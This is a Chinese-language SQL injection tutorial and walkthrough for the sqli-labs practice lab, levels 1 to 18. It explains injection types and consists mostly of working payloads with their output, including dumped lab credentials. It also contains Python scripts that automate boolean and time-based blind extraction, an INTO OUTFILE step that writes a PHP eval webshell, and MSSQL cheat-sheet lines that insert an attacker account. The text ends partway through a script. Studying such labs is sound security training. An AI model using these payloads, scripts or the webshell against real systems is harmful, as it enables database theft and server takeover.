## SQL注入预知识

### 概念

通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令

### 判断是否有注入点

**GET：**

在一些页面，比如说文章列表，商品列表，有类似?id=1的那些地方

以sqli-labs的第一关为例，当我们输入id=1的时候，页面显示正常

当我们输入id=1‘的时候，只要他页面有变化，那就是这里可能存在注入点

**POST：**

这里一般都是那种登录框，登录框有用户名和密码两个框，这两个框都有可能存在注入点

以第11关为例

输入用户名密码后，页面显示正常

随便加一个单引号，页面发生变化



### 判断闭合方式

**数值型**

数值型是没有所谓的闭合方式的，后台代码代码中不对参数做处理，直接将id的值赋值给id变量

```
?id=1 and 1=1	页面显示正常
?id=1 and 1=2	页面显示就变了
```

用or验证	?id=1 or 1=1

页面正常显示

如less2

**字符型**

常见的闭合方式有成对的**' '、" "、（ ）**

less-1为例

?id=1	页面正常

?id=1'	页面发生变化

?id=1' or '1'='1'--+ 或者 ?id=1' --+  页面正常

所以是单引号的闭合

lesson-3为例

假设我们不知道他的闭合方式，我们一点测试

先测试是不是数字型，and 1=2，页面依然正常，不是数字型

### 类型

通过不同的方式可以将SQL注入分为不同的类型，可以按照注入点分类、数据提交方式分类以及执行效果分类等。

#### 注入点分类

##### 数字型注入点

许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 `select * from 表名 where id=1` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`

##### 字符型注入点

网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。

##### 搜索型注入点

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `"keyword=关键字"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`



#### 数据提交方式分类

##### GET注入

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/news.php?id=1 , id 是注入点。

##### POST注入

使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。

##### Cookie注入

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

##### HTTP头部注入

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。



#### 执行效果分类

##### 基于布尔的盲注

即可以根据返回页面判断条件真假的注入。

```
select * from users where username=$username or (condition)
这里如果condition为真的话，整条语句都为真，而如果我们输入的用户名根本不存在的话，返回结果也依然存在，利用这一特性我们就可以我们构造的语句是否正确。
-1' or length(select database())>8--+
类似这样的语句对我们想要获取的数据进行猜测。

而用于布尔盲注的函数有：
left(arg,length)：截取arg左边length长度的字符；
substr(expression,start,length)：从expression第start个字符开始截取，截取的长度为length；
substring(expression,start,length)：作用和上面一样，通常与ascii()函数一起使用；
上面的函数都是比较常见的，还有一些截取字符串的函数：mid()，ascii()函数也可以用hex(),bin()函数替代

步骤和语句
爆库
?id=1' and left((select database()),1)='s'--+
最终确定的库名为security。
爆表
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' --+
修改limit x,1和left中的位数限定数字，爆破到第一张表为referer，终于在第三张表爆破到user表，名为users。
爆列名
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' --+
爆字段
?id=1' and left((select password from users order by id limit 0,1),1)='d' --+
用户名
?id=1' and left((select username from users order by id limit 0,1),1)='d' --+
```



##### 基于时间的盲注

即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

```
时间盲注的关键是通过返回内容的响应时间差异进行条件判断 用于时间盲注的函数：
sleep(N)：可以让语句运行N秒中`；
benchmark(count,exprssion)：重复coutn次执行表达式exprssion；
if(expr1,expr2,expr3)：如果expr1是真的话，返回值为expr2，否则返回值为expr3；
case when expr1 then expr2 else expr3 end：用法与上面一致。

步骤
枚举当前数据库名
  id =1' and sleep(3) and ascii(substr(database(),m,1))>n --+
枚举当前数据库的表名
  id =1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1))>n and sleep(3) --+
或者利用if函数
 id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) >n,sleep(5),1) --+
枚举当前数据库表的字段名
 id =1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit a,1),m,1))>n and sleep(3) --+
枚举每个字段对应的数据项内容
id =1' and ascii(substr((select username from security.users limit a,1),m,1))>n and sleep(3) --+
```



##### 基于报错注入（不存在回显）

即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

1. 单引号

2. 双引号

3. 基于数字型注入

```
原理就是有些特殊的函数会在报错信息中返回参数的值。典型的几个特殊函数有
exp(),extractvalue(),updatexml,rand()+group()+count().

extractvlaue()
函数语法：extractvalue(XML_document,XPath_string);
利用原理：如果XPath_string的格式不符合xpath格式就会产生错误，返回参数的信息，而我们通常利用concat()将~与我们注入的语句拼接在一起从而产生错误。
爆库名
1' and extractvalue(1,concat('~',(select group_concat(schema_name) from information_schema.schemata)))--+
爆表名
1' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='库名')))--+
爆字段名
1' and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名')))--+

updatexml()
函数语法：updatexml(XML_document,XPath_string,new_vvalue)
利用原理：和extractvalue()原理一样。（换函数名）


exp()
函数语法：exp(int)
利用原理：该函数会返回e的x次方，但是mysql能记录的double数值范围有限，一旦超过范围就会报错。而我们在利用的时候会在注入语句前加上运算符'~'，将字符串经过处理后变成大整数从而使mysql报错。
爆库名
1' and exp(~(select * from(select group_concat(schema_name) from information_schema.schemata)))--+
爆表名
1' and exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema='库名')))--+
爆字段名
1' and exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名')))--+


rand()+group()+count()
利用原理：简单来说就是在group_by()语句执行的时候，一行一行的扫描原始表的x字段与虚拟表对比进行一次运算，如果虚拟表中不存在则会插入，但是在插入之前又会进行一次运算，这时运算后的拼接结果就会与之前的结果不同并且可能在虚拟表中之前存在，又因为主键不能重复所以就会报错。
爆库名
-1' union select 1,..,count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2)) as x from information_schema.tables group by x--
爆表名
-1' union select 1,..,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema='库名'),floor(rand(0)*2)) as x from information_schema.tables group by x--+
字段名
-1' union select 1,..,count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名'),floor(rand(0)*2)) as x from information_schema.tables group by x--+

less5 、6、13、14
less-17: 对username做了防护,通过password进行报错注入
```

   

##### 联合查询注入(存在回显)

可以使用union的情况下的注入。

```
这种方式通过关键字union来拼接我们想要执行的sql语句，不过需要注意的是联合注入前后的字段数要保持一致，并且如果返回的数据只有一行的话，前面的sql语句返回结果必须为空。
联合注入的过程
 判断字段数
1' order by  数字 
1' order by 4  发现页面错误，说明没有4列
判断显示位
UNION的作用是将两个select查询结果合并
1' union select 1,2,3 --+
获取数据库名
-1' union select 1,group_concat( schema_name),3 from information_schema.schemata  --+
-1' union select 1,database()),3 from information_schema.schemata  --+
获取表名
-1' union select 1,group_concat( schema_name),3 from information_schema.schemata  --+
-1' union select 1,database()),3 from information_schema.schemata  --+
获取列名
-1' union select 1,group_concat( column_name),3 from information_schema.columns where table_name='users' --+ 
获取数据
-1' union select 1,group_concat(password),3 from security.users --+ 
group_concat(),concat_ws()和concat()三个函数可以相互替换的。

例题	less-1、2、3、4、11、12
```



#### MYSQL重要系统表

```
MySQL注入中要使用到的关键系统表和对应的关键字段
information_schema.SCHEMATA SCHEMA_NAME // MySQL的全部数据库名
information_schema.TABLES TABLE_NAME // MySQL的全部数据表名 TABLE_SCHEMA // 数据表所属的数据库名
information_schema.COLUMNS COLUMN_NAME // MySQL的全部字段名 TABLE_NAME // 字段所属的数据表名 TABLE_SCHEMA // 字段所属的数据库
```



#### 函数

```
length(xx) 返回字符xx长度
id(tiaojian,3,4) tiaojian进行判断，正确则返回3，否则4
left(str,num)  反馈str第num个的字符
```



```
##常用语句

1.判断有无注入点 
; and 1=1 and 1=2


2.猜表一般的表的名称无非是admin adminuser user pass password 等.. 
and 0<>(select count(*) from *) 
and 0<>(select count(*) from admin) ---判断是否存在admin这张表

3.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个 
and 0<(select count(*) from admin) 
and 1<(select count(*) from admin)

4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 
and 1=(select count(*) from admin where len(*)>0)-- 
and 1=(select count(*) from admin where len(用户字段名称name)>0) 
and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)

5.猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止 
and 1=(select count(*) from admin where len(*)>0) 
and 1=(select count(*) from admin where len(name)>6) 错误 
and 1=(select count(*) from admin where len(name)>5) 正确 长度是6 
and 1=(select count(*) from admin where len(name)=6) 正确

and 1=(select count(*) from admin where len(password)>11) 正确 
and 1=(select count(*) from admin where len(password)>12) 错误 长度是12 
and 1=(select count(*) from admin where len(password)=12) 正确

6.猜解字符 
and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位 
and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位 
就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 
and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) -- 
这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.

group by users.id having 1=1-- 
group by users.id, users.username, users.password, users.privs having 1=1-- 
; insert into users values( 666, attacker, foobar, 0xffff )--

UNION SELECT TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS

WHERE TABLE_blank>_NAME=logintable- 
UNION SELECT TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS

WHERE TABLE_blank>_NAME=logintable WHERE COLUMN_blank>_NAME NOT IN (login_blank

>_id)- 
UNION SELECT TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS

WHERE TABLE_blank>_NAME=logintable WHERE COLUMN_blank>_NAME NOT IN (login_blank

>_id,login_blank>_name)- 
UNION SELECT TOP 1 login_blank>_name FROM logintable- 
UNION SELECT TOP 1 password FROM logintable where login_blank>_name=Rahul--

看_blank>服务器打的补丁=出错了打了SP4补丁 
and 1=(select @@VERSION)--

看_blank>数据库连接账号的权限，返回正常，证明是_blank>服务器角色sysadmin权限。 
and 1=(SELECT IS_blank>_SRVROLEMEMBER(sysadmin))--

判断连接_blank>数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA） 
and sa=(SELECT System_blank>_user)-- 
and user_blank>_name()=dbo-- 
and 0<>(select user_blank>_name()--
```

## 联合查询

### 1

1. 闭合测试使用’报错。

```
http://127.0.0.1/sqli/Less-1/?id=1'  
#报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
http://127.0.0.1/sqli-labs-master/Less-1/?id=1‘--+
#不报错
```

可以使用‘用于闭合。

2. 查字段：

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 3--+   //正常
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 4--+   //报错
#Unknown column '4' in 'order clause'
```



3. 查看显示位

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,2,3 --+
#显示为2，3说明显示位为2，3位
```

4. 爆库

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
#一次性报完，一个坑位显示
#Your Login name:information_schema,challenges,mysql,performance_schema,security,test

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' AND 1=2 union select 1,database(),3 --+
#Your Login name:security
```

5. 爆表

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' AND 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
#Your Password:emails,referers,uagents,users
```

6. 爆字段

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' AND 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+
#Your Password:id,username,password
```

7. 爆内容

```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+
#Your Login name:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
#Your Password:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
```

```
group_concat(),concat_ws()和concat()三个函数可以相互替换。
```

### 2-3-4

```
2：无闭合
http://127.0.0.1/sqli-labs-master/Less-2/?id=1 AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+"

3：')闭合
http://127.0.0.1/sqli-labs-master/Less-3/?id=1') AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+"

4：")闭合
http://127.0.0.1/sqli-labs-master/Less-4/?id=1 ") AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+"
```



### 5

题目提示输入id：

```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1
#You are in...........
http://127.0.0.1/sqli-labs-master/Less-5/?id=1'
#报错，采用的是'闭合
```



**extractvlaue()**

函数语法：extractvalue(XML_document,XPath_string);

利用原理：如果XPath_string的格式不符合xpath格式就会产生错误，返回参数的信息，而我们通常利用concat()将~与我们注入的语句拼接在一起从而产生错误。

- 爆库名

```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat('~',(select group_concat(schema_name) from information_schema.schemata)))--+
#XPATH syntax error: '~information_schema,challenges,m'
```

- 爆表名

```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='库名')))--+
#XPATH syntax error: '~CHARACTER_SETS,COLLATIONS,COLLA'
#XPATH syntax error: '~3wteyx0o1y'
# 
```

- 爆字段名

```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名')))--+
#XPATH syntax error: '~CHARACTER_SET_NAME,DEFAULT_COLL'
#XPATH syntax error: '~COLLATION_NAME,CHARACTER_SET_NA'
#
# XPATH syntax error: '~id,sessid,secret_9VV5,tryy'

```

**updatexml()方法**

**exp()方法**

**rand()+group()+count()方法**

**BUG方法**

> [https://bugs.mysql.com/bug.php?id=32249](https://link.jianshu.com/?t=https%3A%2F%2Fbugs.mysql.com%2Fbug.php%3Fid%3D32249)

```
?id=1' and   (select count(*),concat(0x3a,0x3a,database(),0x3a,floor(rand()*2))name from information_schema.tables group by name) --+
 报错：Operand should contain 1 column(s)    操作应包含一列
 {
 kc表是一个数据表，假设表的行数为10行。
 select  1 from kc    增加临时列，每行的列值是写在select后的数，这条sql语句中是1
 }
 我们增加一列
?id=1' and   (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,floor(rand()*2))name from information_schema.tables group by name)) --+
 报错： Every derived table must have its own alias    每个派生表必须有自己的别名
 修改如下
?id=1' and (select 1 from (select  count(*),concat(0x3a,0x3a,database(),0x3a,floor(rand()*2))name from information_schema.tables group by name)b) --+
 报错得到数据库名 Duplicate entry ::security:0 for key' 

 按照之前的想法我们把database() 换成更复杂的语句
 (select table_name from information_schema.tables where table_schema=database() limit 0,1)

 Duplicate entry '::emails:0' for key ''  得到表名email  修改limit得到第二个表

为了得到user表里面的列名 修改一下
(select column_name from information_schema.columns where table_name='users' limit 0,1)
Duplicate entry '::USER:0' for key ''得到了其中的user列名 修改得到其他列名  得到password列名

获取字段内容
 (select password from users  limit 0,1)  得到   Duplicate entry '::Dumb:1' for key ''
```



### 6

与5相同闭合方式由'变成".

### 7

需要进行本地文件写入，根据环境的不同需要进行设置。如果使用PHPstudy的话在mysql配置问卷中的my.ini修改内容。在尾部添加secure-file-priv=""。（如果引号中是一个问卷路径，导入、出的文件路径会在这个路径下）

```
导入到文件
SELECT.....INTO OUTFILE 'file_name'
```

```
文件路径
winserver的iis默认路径c:\Inetpub\wwwroot

linux的nginx一般   /usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等

apache .../var/www/htm，.../var/www/html/htdocs

phpstudy ...\PhpStudy20180211\PHPTutorial\WWW\

xammp ...\xampp\htdocs

```



```
##通过其他地方获得文件路径
Less-2/?id=-1 union select 1,@@basedir,@@datadir --+
##联合查询
###导入
?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "D:\\ctf\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\ttt.php"--+
### 导出
id=1')) union select 1,load_file ('D:\\ctf\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\ttt.php'),'3' #'))
##报错注入
?id=1')) union select 1,group_concat(username),group_concat(password) from users into outfile 'c:\\xampp\\htdocs\\2.php' --+
```

之后用菜刀了解一句话木马即可。

### 8

 布尔型盲注

```
# encoding: utf-8
import requests

result = ""
url_template = "http://127.0.0.1/sqli-labs-master/Less-5/?id=2' and ascii(substr(({0}),{1},1))>{2} %23"
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&%/^!~"
url_length = "http://127.0.0.1/sqli-labs-master/Less-5/?id=2' and length(({0})) >{1} %23"


def get_result_length(payload, value):
    for n in range(1, 100):
        url = url_length.format(payload, n)
        response = requests.get(url)
        length = len(response.text)
        if length > value:
            print("..data length is:"+str(n))
            return n


def get_db_name(data_length, payload, value):
    for i in range(1, data_length):
        for char in chars:
            url = url_template.format(payload, i, ord(char))
            response = requests.get(url)
            length = len(response.text)
            if length > value:  # 根据返回长度的不同来判断字符正确与否
                global result
                result += char
                print("…… data is :" + result)
                break


# 自定义 sql注入语句 payload   分割符 为0
payload = "select group_concat(table_name) from information_schema.tables where table_schema=database() "
# 根据正确访问时错误访问时返回页面文本长度的不同 来设置一个判断值
value = 706
data_length = get_result_length(payload, value) + 1
get_db_name(data_length, payload, value)
print(result)
```



### 9

时间盲注

所有尝试无法得到闭合方式。

时间盲注可以知道其闭合方式以及注入方式。

![image-20200711231653771](sql.assets/image-20200711231653771.png)

![image-20200711231626037](sql.assets/image-20200711231626037.png)

```
#爆库
##确定长度
?id=1' and if(length(database())=4 , sleep(3), 1) --+
当?id=1’ and if(length(database())=8 , sleep(3), 1) --+时明显延迟，所以库名长为8
##确定内容
?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+
###‘security’

#爆表
?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' , sleep(3), 1) --+
##使用limit x,1 查询第x个表名，和爆破库名一样，第一个表名为referer。终于，在第三个表爆到users这个表，显然是用户信息表。

#爆字段
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password', sleep(3), 1) --+
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 9,1),8)='username', sleep(3), 1) --+

#爆值
?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+
?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+
```



```
import requests
value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
data=""
 
# 需要 不断 手工调整 url 和 url_length 中的 limit 的第一个参数 来获取下一行的数据
url = "http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if((ascii(substr(({0} limit 1,1),{1},1)) = '{2}'),sleep(3),NULL); %23"
url_length="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if((length(({0} limit 1,1))={1} ),sleep(3),NULL); %23"
def get_length(payload):
    for n in range(1,100):
        url= url_length.format(payload,n)
        #print(url)
        if(get_respone(url)):
            print("[+] length is {0}".format(n))
            return n
def get_data(payload,value,length):
    for n in range(1,length):
        for v in value :
            url_data = url.format(payload,n,ord(v)) #ord（）返回字符的ASCII码
            #print(url_data)
            if(get_respone(url_data)):
                global data
                data=data+v
                print("[+] data is {0}".format(data))
                break
def get_respone(url):
    try:
        html = requests.get(url,timeout=2)
        return False
    except Exception as e:
        print("......")
        return True
#可以更改payload 来获取需要的数据
databse_payload ="select database()"
get_data(databse_payload,value,get_length(databse_payload)+1)
```



### 10

时间盲注，与9同，闭合方式为"



### 11

判断闭合（利用反斜杠）

```
uname=Dumb\&passwd=&submit=Submit
```

![image-20200712000501964](sql.assets/image-20200712000501964.png)



判断坑位：

```
uname=00' union select 1,2#&passwd=&submit=Submit
```

![image-20200712000143635](sql.assets/image-20200712000143635.png)



注入方法：

法一：extractvalue测试payload

```
uname=admin' and 1=1# &passwd=admin&submit=Submit //能登陆
uname=admin' and 1=2# &passwd=admin&submit=Submit //不能登陆
```

以上说明存在报错型注入。

```
#爆库
uname=admin' and extractvalue(1,concat(0x7e,(select database()))) #&passwd=admin&submit=Submit
##XPATH syntax error: '~security'

#爆表
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#&passwd=admin&submit=Submit
##XPATH syntax error: '~emails,referers,uagents,users'

##只能查询到前几个表，后面加上not in ()就可以查到其他表了，如：
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in ('emails')))) #&passwd=admin&submit=Submit

#爆列名
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) #&passwd=admin&submit=Submit
##机械操作对其他的进行处理

#爆值
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))#&passwd=admin&submit=Submit

##同样not in查其他值
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit


```

法二：联合查询

```
uname=0' union select 1,2  # &passwd=admin&submit=Submit
```

uname需要是不存在或者错误的才能显示坑位。

```
#爆库
uname=0' union select 1,database() #&passwd=admin&submit=Submit

##Your Login name:1
##Your Password:security

#下述操作与get的方法相同
#爆表
uname=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security') #&passwd=admin&submit=Submit
##Your Login name:1
##Your Password:emails,referers,uagents,users

#爆字段
uname=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' table_schema='security')#&passwd=admin&submit=Submit

#查用户名密码
select group_concat(username) from db_name.table_name
```



### 12

同11，闭合方式为").其余操作与11雷同。

![image-20200712003410538](sql.assets/image-20200712003410538.png)



### 13

成功登陆没有返回信息，需要盲注

**方法一：报错型**

报错注入方法，闭合方式为')其余部分和11相同。

**方法二：时间盲注**

```
uname=admin') and if(left(database(),1)='s',sleep(3),1) # &passwd=admin&submit=Submit
```



### 14

修改闭合方式为""，同13.

### 15

布尔测试：

```
uname=admin' and 1=1 #&passwd=admin&submit=Submit    //登陆成功
uname=admin' and 1=2 #&passwd=admin&submit=Submit    //登录失败
```

时间延迟测试：

```
uname=admin' and sleep(5) #&passwd=admin&submit=Submit
```

```
时间延迟：

uname=admin' and if(length(database())=8,sleep(5),1)#&passwd=admin&submit=Submit
 
uname=admin' and if(left(database(),1)='s',sleep(5),1)#&passwd=admin&submit=Submit
 
uname=admin' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)#&passwd=admin&submit=Submit
 
uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)#&passwd=admin&submit=Submit
uname=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)#&passwd=admin&submit=Submit
 
uname=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)#&passwd=admin&submit=Submit
```



```
#脚本
##延时型
import requests
import time
value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
result=""
 
def get_length():#获取数据的长度
    for n in range(1, 100):
        payload = "admin' and if((length(({0} ))={1}),sleep(4),1) #".format(data_payload, n)
        data = {"uname": payload, "passwd": "admin", "submit": "submit"}
        start_time = time.time()
        html = requests.post(url, data=data)
        end_time = time.time()
        use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了
        if use_time > 3:
            print("...... data's length is :"+ str(n))
            return n
 
def get_data(length):#获取数据
    global result
    for n in range(1,length):
        for v in value:
            payload = "admin' and if((ascii(substr(({0} ),{1},1)) = '{2}'),sleep(5),1) #".format(data_payload,n,ord(v))
            data = {"uname":payload,"passwd":"admin","submit":"submit"}
            start_time = time.time()
            requests.post(url,data=data)
            end_time = time.time()
            use_time = end_time - start_time
            # 为啥把sleep时间设这么长呢？原因是我这里时常会出现网络波动，有时候请求时间就有2秒多，为避免出现乱码，所以设长一点可以保证信息的准确性
            if use_time >4:
                result += v
                print("......"+result)
 
 
 
url = "http://192.168.1.101/sqli-labs-master/Less-15/"
 
data_payload ="select group_concat(table_name,0x7e)from information_schema.tables where table_schema=database()"
 
length = get_length() + 1   #注意这里要长度加 1 因为 range（1,10）的范围是 1<= x <10
get_data(length)
print(".....data is :"+ result)
```

```
#脚本
##布尔型
import requests
 
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&%/^!~"
result = ""
 
def get_length(value):  #获取要查询的数据的长度
    for n in range(1,100):
        payload = "admin' and length(({0})) ={1} #".format(data_payload,n)
        data = {"uname":payload,"passwd":"admin"}
        html = requests.post(url,data=data)
        length = len(html.text)
        if length >value:
            print("……data length is :" + str(n))
            return  n
 
def get_data(data_length,value): #获取数据
    global result
    for i in range(1,data_length):
        for char in chars:
            payload = "admin'and ascii(substr(({0}),{1},1))={2} #".format(data_payload,i,ord(char))
            data = {"uname":payload,"passwd":"admin"}
            html = requests.post(url,data=data)
            length = len(html.text)
            if length>value:         #根据返回长度的不同来判断字符正确与否
                result += char
                print("…… data is :"+ result)
                break
 
 
url = "http://192.168.1.101/sqli-labs-master/Less-15"
data_payload = "select group_concat(table_name)from information_schema.tables where table_schema = database()"
value = 1460     # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看
 
length = get_length(value) +1
get_data(length,value)
print(result)
```

### 16

与15相同，修改闭合方式。

### 17

对uname进行了很强的过滤，所以把坑位利用放password上，可以使用报错注入（updatexml()\extractvalue()）

最后爆值的时候报错：

```
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) # &submit=Submit
```



> You can't specify target table 'users' for update in FROM clause
>
> **错误原因：** 在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。

修改select为两层

```
uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users where username='admin') mingzi ),0x7e),1) #&submit=Submit
```







### 18

http头部报错注入

burpsuit进行抓包/hackbar也行，对头部进行修改。

```
Accept : 浏览器能够处理的内容类型
Accept-Charset : 浏览器能够显示的字符集
Accept-Encoding : 浏览器能处理的压缩编码
Accept-Language : 浏览器当前设置的语言
Connection : 浏览器与服务器之间的连接
cookie : 当前页面设置的cookie
Host : 发出请求的页面所在域
Referer : 发出请求的页面URL
User-agent : 浏览器用户代理字符串
Server : web服务器表明自己是什么软件及版本信息
###
HTTP 头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。HTTP头注入常常发生在程序采集用户信息的模块中。例如
X-Forwarded-For/Client-IP 用户IP
User-Agent 用户代理的设备信息
Referer 告诉服务器该网页是从哪个页面链接过来的
Cookie  标识用户的身份信息
Cookie型注入是通过Cookie进行数据提交的，其常见的情况有验证登录、$_REQUEST获取参数。验证登录是将用户的登录信息放入Cookie来做权限验证的一种方法
```



直接修改没有报错信息，我们需要post才可以修改头来反馈报错信息/

![image-20200712084456624](sql.assets/image-20200712084456624.png)



![image-20200712084354969](sql.assets/image-20200712084354969.png)

报错注入

爆库

![image-20200712085049530](sql.assets/image-20200712085049530.png)



其余类推。

！

```
#脚本
import requests

url = "http://192.168.1.101/sqli-labs-master/Less-18/"

postDate = {
	'uname':'admin',
	'passwd':'1'
}

headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
	'Cache-Control':'max-age=0',
